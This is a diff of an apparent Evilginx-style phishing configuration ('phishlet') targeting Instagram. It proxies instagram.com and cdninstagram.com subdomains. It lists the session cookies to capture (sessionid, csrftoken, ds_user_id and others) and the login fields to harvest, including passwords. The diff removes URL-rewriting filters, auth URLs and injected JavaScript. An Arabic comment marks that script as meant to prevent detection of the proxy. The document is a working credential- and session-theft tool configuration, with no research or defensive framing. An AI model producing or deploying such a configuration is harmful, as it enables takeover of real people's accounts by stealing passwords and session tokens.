@@ -1,62 +1,22 @@
-name: 'Instagram Enhanced'
+name: 'Instagram-Pro'
 target_domain: 'www.instagram.com'
 proxy_hosts:
   - { phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com' }
-  - { phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com' }
-  - { phish_sub: 'help', orig_sub: 'help', domain: 'instagram.com' }
-  - { phish_sub: 'about', orig_sub: 'about', domain: 'instagram.com' }
-  - { phish_sub: 'blog', orig_sub: 'blog', domain: 'instagram.com' }
-  # نطاقات CDN الأساسية (مهمة جداً)
   - { phish_sub: 'static', orig_sub: 'static', domain: 'cdninstagram.com' }
+  - { phish_sub: 'z-p3-static', orig_sub: 'z-p3-static', domain: 'cdninstagram.com' }
   - { phish_sub: 'scontent', orig_sub: 'scontent', domain: 'cdninstagram.com' }
   - { phish_sub: 'graph', orig_sub: 'graph', domain: 'instagram.com' }
   - { phish_sub: 'api', orig_sub: 'api', domain: 'instagram.com' }
-
-sub_filters:
-  - hostname: '{hostname}'
-    sub: 'www'
-    domain: 'instagram.com'
-    search: '(?:https?:)?(?:\/\/)?(?:[a-zA-Z0-9-]+\.)*(?:instagram\.com|cdninstagram\.com|fbcdn\.net)'
-    replace: 'https://{hostname}'
-    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/*', 'font/*']
 
 auth_tokens:
   - 'sessionid'
   - 'ds_user_id'
   - 'csrftoken'
-  - 'rur'
   - 'mid'
   - 'ig_did'
-  - 'datr'
-  - 'shbid'
-  - 'shbts'
 
 creds_fields:
   - 'username'
   - 'password'
   - 'emailOrPhone'
   - 'enc_password'
-
-auth_urls:
-  - 'https://www.instagram.com/accounts/onetap/?next=%2F'
-  - 'https://www.instagram.com/direct/inbox/'
-  - 'https://www.instagram.com/'
-
-js_inject: |
-  // إصلاح الروابط ديناميكياً في المتصفح كخطة احتياطية
-  (function() {
-    const currentHost = window.location.host;
-    const domainsToReplace = ['instagram.com', 'cdninstagram.com', 'fbcdn.net'];
-    document.querySelectorAll('link[href], script[src], img[src]').forEach(el => {
-      ['href', 'src'].forEach(attr => {
-        if (el.hasAttribute(attr)) {
-          let url = el.getAttribute(attr);
-          if (domainsToReplace.some(d => url.includes(d))) {
-            el.setAttribute(attr, url.replace(/https?:\/\/([^\/]+)/, `https://${currentHost}`));
-          }
-        }
-      });
-    });
-  })();
-  // منع اكتشاف البروكسي
-  Object.defineProperty(document, 'domain', {value: 'instagram.com'});
